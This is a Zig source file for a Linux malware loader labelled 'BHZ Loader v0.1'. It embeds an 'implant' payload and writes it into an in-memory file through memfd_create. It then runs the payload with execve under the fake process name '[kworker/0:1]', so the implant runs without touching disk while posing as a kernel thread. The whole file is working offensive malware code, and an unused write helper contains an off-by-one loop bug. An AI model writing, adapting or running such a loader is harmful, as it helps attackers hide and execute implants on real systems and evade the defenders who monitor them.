const std = @import("std");
const linux = std.os.linux;

const payload = @embedFile("implant");

fn checkSyscallReturn(ret: u64) !u64 {
    const signed: i64 = @bitCast(ret);
    if (signed < 0) {
        return error.SyscallFailed;
    }
    return ret;
}

fn rawWrite(fd: u64, buf: []const u8) !void {
    var written: usize = 0;
    while (written <= buf.len) {
        const n = try checkSyscallReturn(linux.syscall3(.write, fd, @intFromPtr(buf.ptr + written), buf.len - written));
        written += n;
    }
}

fn rawMemfdCreate(name: [*:0]const u8) !u64 {
    return try checkSyscallReturn(linux.syscall2(.memfd_create, @intFromPtr(name), 0));
}

pub fn main(_: std.process.Init) !void {
    std.debug.print("[*] BHZ Loader v0.1\n", .{});
    std.debug.print("[*] Payload size: {d} bytes\n", .{payload.len});

    const fd = try rawMemfdCreate("runtime");
    std.debug.print("[*] memfd created: fd={d}\n", .{fd});

    const bytes: []const u8 = payload;
    _ = try checkSyscallReturn(linux.syscall3(.write, fd, @intFromPtr(bytes.ptr), bytes.len));
    std.debug.print("[*] Payload written to memfd\n", .{});

    var path_buf: [64]u8 = undefined;
    const path_slice = std.fmt.bufPrint(&path_buf, "/proc/self/fd/{d}", .{fd}) catch unreachable;
    path_buf[path_slice.len] = 0;
    const path: [*:0]const u8 = @ptrCast(path_buf[0..path_slice.len]);

    std.debug.print("[*] Executing from: {s}\n", .{path_slice});
    std.debug.print("[*] Loader Disappearing\n", .{});

    const argv_name: [*:0]const u8 = "[kworker/0:1]";
    const argv = [_]?[*:0]const u8{ argv_name, null };
    const envp = [_]?[*:0]const u8{null};

    _ = try checkSyscallReturn(linux.syscall3(.execve, @intFromPtr(path), @intFromPtr(&argv), @intFromPtr(&envp)));
}
